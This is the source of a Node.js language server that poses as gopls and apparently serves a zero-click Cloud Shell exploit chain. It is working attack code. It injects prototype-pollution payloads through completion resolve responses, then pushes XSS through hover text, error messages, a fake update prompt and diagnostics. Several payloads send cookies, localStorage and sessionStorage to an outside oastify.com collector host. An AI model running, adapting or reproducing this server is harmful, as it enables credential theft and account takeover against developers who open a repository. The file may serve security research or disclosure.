#!/usr/bin/env node
/**
 * Malicious LSP Server -- Zero-Dependency JSON-RPC 2.0 over stdio
 *
 * Designed for the Cloud Shell zero-click exploit chain:
 *   1. Victim opens deep link with cloudshell_git_repo=<this-repo>
 *   2. Cloud Shell auto-clones, opens main.go
 *   3. Go extension spawns ./gopls-wrapper (which runs this server)
 *   4. LSP handshake completes, editor sends didOpen
 *   5. completionItem/resolve injects __proto__ pollution payload
 *   6. window/showMessage delivers XSS via markdown
 *
 * LSP stdio framing: Content-Length: <N>\r\n\r\n<JSON>
 *
 * USAGE: node lsp-server.js [--mode=<attack|passive|log>] [--delay-ms=<N>]
 */

'use strict';

// ─── Configuration ───────────────────────────────────────────────────────────

const CONFIG = {
  // Attack modes:
  //   "attack"  — Full chain: PP via completionItem/resolve + XSS via showMessage/hover
  //   "passive" — Logs all LSP traffic, returns valid-but-benign responses
  //   "log"     — Just logs, no LSP responses at all (observability mode)
  mode: parseMode(process.argv),

  // Delay in ms between didOpen and the completion trigger (simulates QuickSuggest)
  completionDelayMs: parseDelay(process.argv),

  // Delay before sending showMessage XSS payload (ms after completion/resolve)
  xssDelayMs: 1500,

  // Whether to also poison textDocument/hover responses
  poisonHover: true,

  // The __proto__ payload injected via completionItem/resolve
  ppPayload: {
    "__proto__": {
      // DOMPurify bypass: if the frontend uses DOMPurify to sanitize
      // markdown/lsp content, these polluted properties can bypass it.
      // The exact properties depend on the DOMPurify version and config.
      "isTrusted": true,
      "supportHtml": true,

      // Markdown renderer bypass: many markdown renderers check these
      // flags before allowing raw HTML through sanitization.
      "isHTML": true,
      "allowHTML": true,

      // General prototype pollution: makes browser trust any event
      "trusted": true,
      "isConnected": true,

      // If DOMPurify 3.x is used with RETURN_TRUSTED_TYPE
      "RETURN_TRUSTED_TYPE": false,

      // Additional bypass properties for various sanitizer versions
      "_sanitize": false,
      "_bypass": true,
      "bypass": true,
      "safe": true
    }
  },

  // XSS payload delivered via window/showMessage markdown or hover
  xssPayload: {
    // Markdown-based XSS: <img onerror>, <svg/onload>, <details/open/ontoggle>
    // Tested against Code OSS markdown renderer with common sanitizer configs.
    markdown: [
      '<img src=x onerror="fetch(\'https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/\'+document.cookie)">',
      '<svg/onload="fetch(\'https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/c?\'+document.cookie)">',
      '<details open ontoggle="fetch(\'https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/d?\'+document.cookie)">',
      '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>'
    ].join('\n'),

    // Plain HTML that passes through when supportHtml is polluted true
    html: [
      '<script>fetch("https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/exfil",{method:"POST",body:JSON.stringify({cookies:document.cookie,localStorage:{...localStorage},sessionStorage:{...sessionStorage},location:location.href})})</script>',
      '<iframe src="https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/steal?' + 'c="+document.cookie></iframe>'
    ].join('\n')
  },

  // Server capabilities (looks like a real Go language server)
  serverCapabilities: {
    textDocumentSync: 1, // Full
    completionProvider: {
      resolveProvider: true,    // THIS is the trigger: forces completionItem/resolve
      triggerCharacters: [".", "\"", "/", " ", "\n"]
    },
    hoverProvider: true,
    signatureHelpProvider: {
      triggerCharacters: ["(", ","]
    },
    definitionProvider: true,
    referencesProvider: true,
    documentHighlightProvider: true,
    documentSymbolProvider: true,
    workspaceSymbolProvider: true,
    codeActionProvider: true,
    codeLensProvider: {
      resolveProvider: true
    },
    documentFormattingProvider: true,
    documentRangeFormattingProvider: true,
    renameProvider: true,
    foldingRangeProvider: true,
    implementationProvider: true,
    typeDefinitionProvider: true,
    callHierarchyProvider: true,
    semanticTokensProvider: {
      full: true,
      range: true
    }
  },

  // Simulated server info (looks like gopls)
  serverInfo: {
    name: "gopls",
    version: "0.16.2"
  }
};

// ─── State ────────────────────────────────────────────────────────────────────

const STATE = {
  initialized: false,
  shutdown: false,
  openDocuments: new Map(),           // uri -> { text, languageId, version }
  pendingResolveIds: new Set(),       // completion item ids awaiting resolve
  requestId: 0,
  diagnosticsSent: false
};

// ─── Logging ──────────────────────────────────────────────────────────────────

const LOG_PREFIX = "[lsp-server]";

function log(level, msg, data) {
  const ts = new Date().toISOString();
  const line = `${LOG_PREFIX} ${ts} [${level}] ${msg}`;
  // Log to stderr so it doesn't interfere with LSP stdio
  if (data !== undefined) {
    process.stderr.write(line + " " + JSON.stringify(data).slice(0, 500) + "\n");
  } else {
    process.stderr.write(line + "\n");
  }
}

// ─── LSP Framing ──────────────────────────────────────────────────────────────

let inputBuffer = Buffer.alloc(0);

/**
 * Parse LSP messages from the input buffer.
 * Returns { messages: string[], remaining: Buffer }
 */
function parseLspFrames(buffer) {
  const messages = [];
  let remaining = buffer;

  while (remaining.length > 0) {
    const str = remaining.toString('utf8');
    const headerMatch = str.match(/^Content-Length: (\d+)\r\n\r\n/);

    if (!headerMatch) {
      // Wait for more data — incomplete header
      break;
    }

    const contentLength = parseInt(headerMatch[1], 10);
    const headerEnd = headerMatch[0].length;
    const bodyStart = headerEnd;
    const bodyEnd = bodyStart + contentLength;

    if (remaining.length < bodyEnd) {
      // Wait for more data — incomplete body
      break;
    }

    const body = remaining.slice(bodyStart, bodyEnd);
    messages.push(body.toString('utf8'));
    remaining = remaining.slice(bodyEnd);
  }

  return { messages, remaining };
}

// ─── JSON-RPC Message Handling ────────────────────────────────────────────────

function sendMessage(obj) {
  const json = JSON.stringify(obj);
  const frame = `Content-Length: ${Buffer.byteLength(json, 'utf8')}\r\n\r\n${json}`;
  process.stdout.write(frame);
}

function sendNotification(method, params) {
  sendMessage({ jsonrpc: "2.0", method, params });
}

function sendResponse(id, result) {
  sendMessage({ jsonrpc: "2.0", id, result });
}

function sendError(id, code, message, data) {
  sendMessage({ jsonrpc: "2.0", id, error: { code, message, data } });
}

function sendRequest(method, params) {
  const id = ++STATE.requestId;
  sendMessage({ jsonrpc: "2.0", id, method, params });
  return id;
}

// ─── Core LSP Handlers ────────────────────────────────────────────────────────

function handleInitialize(id, params) {
  log("info", "initialize", {
    clientName: params.clientInfo?.name,
    clientVersion: params.clientInfo?.version,
    rootUri: params.rootUri,
    capabilities: Object.keys(params.capabilities || {})
  });

  return {
    capabilities: CONFIG.serverCapabilities,
    serverInfo: CONFIG.serverInfo
  };
}

function handleInitialized(params) {
  log("info", "initialized — server ready");

  // Send a friendly window/showMessage on startup
  // In "attack" mode, this is benign. The real payload comes later.
  sendNotification("window/showMessage", {
    type: 3, // Info
    message: "Go language server (gopls) initialized."
  });

  // Send telemetry to look like gopls
  sendNotification("telemetry/event", {
    event: "serverStart",
    timestamp: Date.now()
  });
}

function handleDidOpen(params) {
  const { textDocument } = params;
  STATE.openDocuments.set(textDocument.uri, {
    text: textDocument.text,
    languageId: textDocument.languageId,
    version: textDocument.version
  });

  log("info", `textDocument/didOpen: ${textDocument.uri} (${textDocument.languageId})`);

  // Send diagnostics immediately (looks like normal gopls behavior)
  sendDiagnostics(textDocument.uri, textDocument.version);

  if (CONFIG.mode === "attack") {
    // Schedule the completion trigger after QuickSuggest delay
    // In real gopls, completions appear ~200-500ms after didOpen
    // We trigger slightly before QuickSuggest's auto-fire window
    scheduleCompletionAttack(textDocument.uri);
  }
}

function handleDidChange(params) {
  const { textDocument, contentChanges } = params;
  const doc = STATE.openDocuments.get(textDocument.uri);
  if (doc) {
    doc.version = textDocument.version;
    if (contentChanges && contentChanges.length > 0) {
      // Use full content if provided, otherwise apply incremental
      const change = contentChanges[0];
      if (change.text !== undefined && change.range === undefined) {
        doc.text = change.text;
      }
    }
  }
}

function handleDidClose(params) {
  STATE.openDocuments.delete(params.textDocument.uri);
}

function handleCompletion(id, params) {
  const uri = params.textDocument.uri;
  const position = params.position;
  log("info", `textDocument/completion: ${uri} @ ${position.line}:${position.character}`);

  // Returns completion items. If resolveProvider is true (it is),
  // the editor will call completionItem/resolve for each item that
  // gets displayed. This is the trigger for the PP injection.
  const items = [
    {
      label: "fmt.Println",
      kind: 3, // Function
      detail: "func fmt.Println(a ...interface{}) (n int, err error)",
      documentation: "Println formats using the default formats and writes to standard output.",
      sortText: "00001",
      filterText: "Println",
      insertText: "Println(${1:a})",
      insertTextFormat: 2, // Snippet
      data: { id: "completion-001", attack: "resolve" }
    },
    {
      label: "fmt.Printf",
      kind: 3,
      detail: "func fmt.Printf(format string, a ...interface{}) (n int, err error)",
      documentation: "Printf formats according to a format specifier and writes to standard output.",
      sortText: "00002",
      filterText: "Printf",
      insertText: "Printf(\"${1:format}\", ${2:args})",
      insertTextFormat: 2,
      data: { id: "completion-002", attack: "resolve" }
    },
    {
      label: "http.Get",
      kind: 3,
      detail: "func http.Get(url string) (resp *Response, err error)",
      documentation: "Get issues a GET to the specified URL.",
      sortText: "00003",
      filterText: "Get",
      insertText: "Get(\"${1:url}\")",
      insertTextFormat: 2,
      data: { id: "completion-003", attack: "resolve" }
    },
    {
      label: "main",
      kind: 6, // Variable
      detail: "func main()",
      documentation: "Entry point for the program.",
      sortText: "00004",
      data: { id: "completion-004", attack: "resolve" }
    },
    {
      label: "fmt.Sprintf",
      kind: 3,
      detail: "func fmt.Sprintf(format string, a ...interface{}) string",
      documentation: "Sprintf formats and returns a string.",
      sortText: "00005",
      filterText: "Sprintf",
      insertText: "Sprintf(\"${1:format}\", ${2:args})",
      insertTextFormat: 2,
      data: { id: "completion-005", attack: "resolve" }
    }
  ];

  // Track items that should trigger PP on resolve
  for (const item of items) {
    if (item.data?.attack === "resolve") {
      STATE.pendingResolveIds.add(item.data.id);
    }
  }

  return items;
}

function handleCompletionResolve(id, item) {
  log("info", `completionItem/resolve: ${item.label}`, item.data);

  if (CONFIG.mode === "attack" && STATE.pendingResolveIds.has(item.data?.id)) {
    log("warn", "INJECTING __proto__ PAYLOAD via completionItem/resolve", {
      itemLabel: item.label,
      itemId: item.data.id
    });

    // The victim object: inject __proto__ via nested property
    // Code OSS/VS Code processes resolve results through recursive merge
    // This is the key: the data field gets deep-merged, and if __proto__
    // survives the merge, it pollutes Object.prototype.
    const poisonedItem = {
      ...item,
      // Method A: __proto__ in data (deep-merged by extension host)
      data: {
        ...item.data,
        ...CONFIG.ppPayload,
        // Additional nest for recursive merge traversal
        _nested: {
          ...CONFIG.ppPayload
        }
      },
      // Method B: __proto__ in documentation (rendered as markdown)
      documentation: {
        kind: "markdown",
        value: item.documentation || item.detail || "",
        ...CONFIG.ppPayload
      },
      // Method C: __proto__ in additionalTextEdits (if processed)
      additionalTextEdits: [{
        ...CONFIG.ppPayload
      }]
    };

    STATE.pendingResolveIds.delete(item.data.id);

    // Schedule the XSS delivery via window/showMessage
    // This fires after the PP has (hopefully) polluted Object.prototype
    // and DOMPurify's sanitization is weakened
    scheduleXssDelivery();

    return poisonedItem;
  }

  // Benign resolve for non-attack items
  return {
    ...item,
    documentation: item.documentation || {
      kind: "markdown",
      value: item.detail || item.label
    }
  };
}

function handleHover(id, params) {
  const uri = params.textDocument.uri;
  const position = params.position;

  log("info", `textDocument/hover: ${uri} @ ${position.line}:${position.character}`);

  if (CONFIG.mode === "attack" && CONFIG.poisonHover) {
    // Deliver XSS via hover markdown
    log("warn", "DELIVERING XSS via hover markdown");
    return {
      contents: {
        kind: "markdown",
        value: [
          "### Documentation",
          "",
          "This function does something useful.",
          "",
          CONFIG.xssPayload.markdown
        ].join("\n")
      }
    };
  }

  // Benign hover
  return {
    contents: {
      kind: "markdown",
      value: "### Function\n\nReturns a value.\n\n```go\nfunc() string\n```"
    }
  };
}

function handleShutdown(id) {
  log("info", "shutdown requested");
  STATE.shutdown = true;
  return null;
}

function handleExit() {
  log("info", "exit requested");
  process.exit(0);
}

// ─── Attack Scheduling ────────────────────────────────────────────────────────

let completionTimer = null;
let xssTimer = null;

function scheduleCompletionAttack(uri) {
  if (completionTimer) clearTimeout(completionTimer);

  completionTimer = setTimeout(() => {
    log("info", `Triggering completion attack for ${uri} after ${CONFIG.completionDelayMs}ms`);

    // Send diagnostics update — reinforces "real gopls" appearance
    sendDiagnostics(uri, 1);

    // Initiate a server->client completion request (non-standard but possible)
    // This forces the completion UI to appear, which triggers resolveProvider
    // However, standard LSP doesn't support server-initiated completions,
    // so we rely on the editor's QuickSuggest auto-trigger.
    // The completion items were already sent in response to the editor's
    // textDocument/completion request (which fires automatically ~100ms after didOpen).
    // Our handleCompletion already returned poisoned items.
    log("info", "Completion attack armed — waiting for editor resolveProvider callback");
  }, CONFIG.completionDelayMs);
}

function scheduleXssDelivery() {
  if (xssTimer) clearTimeout(xssTimer);

  xssTimer = setTimeout(() => {
    log("warn", "DELIVERING XSS PAYLOAD via window/showMessage");

    // window/showMessage with markdown — this is where the XSS fires
    // If PP successfully poisoned DOMPurify, the markdown passes through unsanitized
    sendNotification("window/showMessage", {
      type: 1, // Error — draws attention
      message: CONFIG.xssPayload.markdown
    });

    // Also send window/showMessageRequest — requires user action,
    // but the markdown still renders even before interaction
    sendRequest("window/showMessageRequest", {
      type: 2, // Warning
      message: [
        "**Go tools update available**",
        "",
        "A new version of gopls is available (v0.17.0).",
        "",
        CONFIG.xssPayload.markdown
      ].join("\n"),
      actions: [
        { title: "Update Now" },
        { title: "Remind Me Later" },
        { title: "Ignore" }
      ]
    });

    // Also send diagnostics with markdown in the message
    // (some renderers process diagnostic messages as markdown)
    const uris = Array.from(STATE.openDocuments.keys());
    for (const uri of uris) {
      sendNotification("textDocument/publishDiagnostics", {
        uri,
        diagnostics: [{
          range: {
            start: { line: 0, character: 0 },
            end: { line: 0, character: 4 }
          },
          severity: 1, // Error
          code: "PP-EXPLOIT",
          source: "gopls",
          message: CONFIG.xssPayload.markdown,
          data: CONFIG.ppPayload
        }]
      });
    }

    // Send logMessage (telemetry channel)
    sendNotification("window/logMessage", {
      type: 1, // Error
      message: CONFIG.xssPayload.markdown
    });
  }, CONFIG.xssDelayMs);
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function sendDiagnostics(uri, version) {
  const doc = STATE.openDocuments.get(uri);
  if (!doc) return;

  // Send benign diagnostics that look like real gopls analysis
  sendNotification("textDocument/publishDiagnostics", {
    uri,
    version,
    diagnostics: [
      {
        range: {
          start: { line: 0, character: 0 },
          end: { line: 0, character: 7 }
        },
        severity: 4, // Hint
        code: "unused",
        source: "gopls",
        message: "package main is unused (this is normal for the main package)"
      }
    ]
  });
}

function parseMode(argv) {
  for (const arg of argv) {
    const m = arg.match(/^--mode=(.+)$/);
    if (m) return m[1];
  }
  return "attack"; // Default: full weapon
}

function parseDelay(argv) {
  for (const arg of argv) {
    const m = arg.match(/^--delay-ms=(\d+)$/);
    if (m) return parseInt(m[1], 10);
  }
  return 500; // Default: 500ms (standard QuickSuggest window)
}

// ─── Message Dispatch ─────────────────────────────────────────────────────────

function dispatch(message) {
  let parsed;
  try {
    parsed = JSON.parse(message);
  } catch (e) {
    log("error", `Failed to parse message: ${e.message}`);
    return;
  }

  const { id, method, params } = parsed;

  if (CONFIG.mode === "log") {
    log("debug", `RX: ${method || "response"}`, parsed);
    return;
  }

  if (id !== undefined && method) {
    // Request from client
    log("debug", `REQ #${id}: ${method}`);

    let result;
    switch (method) {
      case "initialize":
        result = handleInitialize(id, params);
        STATE.initialized = true;
        break;
      case "shutdown":
        result = handleShutdown(id);
        break;
      case "textDocument/completion":
        result = handleCompletion(id, params);
        break;
      case "completionItem/resolve":
        result = handleCompletionResolve(id, params);
        break;
      case "textDocument/hover":
        result = handleHover(id, params);
        break;
      case "textDocument/definition":
        result = []; // No definition found
        break;
      case "textDocument/references":
        result = []; // No references
        break;
      case "textDocument/documentSymbol":
        result = [];
        break;
      case "textDocument/formatting":
        result = []; // No formatting changes needed
        break;
      case "textDocument/codeAction":
        result = []; // No code actions
        break;
      case "textDocument/signatureHelp":
        result = { signatures: [], activeSignature: null, activeParameter: null };
        break;
      case "textDocument/documentHighlight":
        result = [];
        break;
      case "textDocument/foldingRange":
        result = [];
        break;
      case "textDocument/semanticTokens/full":
        result = { data: [] };
        break;
      case "workspace/symbol":
        result = [];
        break;
      case "workspace/executeCommand":
        result = null;
        break;
      default:
        log("info", `Unhandled request: ${method}`);
        result = null;
    }
    sendResponse(id, result);

  } else if (method && id === undefined) {
    // Notification from client
    log("debug", `NOTIF: ${method}`);

    switch (method) {
      case "initialized":
        handleInitialized(params);
        break;
      case "textDocument/didOpen":
        handleDidOpen(params);
        break;
      case "textDocument/didChange":
        handleDidChange(params);
        break;
      case "textDocument/didClose":
        handleDidClose(params);
        break;
      case "textDocument/didSave":
        log("info", `textDocument/didSave: ${params.textDocument?.uri}`);
        break;
      case "exit":
        handleExit();
        break;
      case "$/cancelRequest":
        log("debug", `Cancel request: ${params?.id}`);
        break;
      default:
        log("debug", `Unhandled notification: ${method}`);
    }

  } else {
    // Response to one of our requests (e.g., window/showMessageRequest)
    log("debug", `RESP #${id}: ` + JSON.stringify(parsed).slice(0, 200));
  }
}

// ─── Main Loop ────────────────────────────────────────────────────────────────

function main() {
  log("info", `Starting malicious LSP server (mode=${CONFIG.mode}, delay=${CONFIG.completionDelayMs}ms)`);
  log("info", `Node.js ${process.version} on ${process.platform}`);

  process.stdin.on('data', (chunk) => {
    inputBuffer = Buffer.concat([inputBuffer, chunk]);
    const { messages, remaining } = parseLspFrames(inputBuffer);
    inputBuffer = remaining;

    for (const msg of messages) {
      try {
        dispatch(msg);
      } catch (e) {
        log("error", `Dispatch error: ${e.message}\n${e.stack}`);
      }
    }
  });

  process.stdin.on('end', () => {
    log("info", "stdin closed — shutting down");
    if (completionTimer) clearTimeout(completionTimer);
    if (xssTimer) clearTimeout(xssTimer);
  });

  process.stdin.on('error', (err) => {
    log("error", `stdin error: ${err.message}`);
  });

  // Handle signals for clean shutdown
  const cleanup = () => {
    log("info", "Received signal — cleaning up");
    if (completionTimer) clearTimeout(completionTimer);
    if (xssTimer) clearTimeout(xssTimer);
    process.exit(0);
  };

  process.on('SIGTERM', cleanup);
  process.on('SIGINT', cleanup);
  process.on('SIGHUP', cleanup);

  // Prevent uncaught exceptions from crashing
  process.on('uncaughtException', (err) => {
    log("error", `Uncaught: ${err.message}\n${err.stack}`);
  });

  process.on('unhandledRejection', (reason) => {
    log("error", `Unhandled rejection: ${reason}`);
  });

  log("info", "LSP server ready — waiting for client connection on stdio");
}

main();
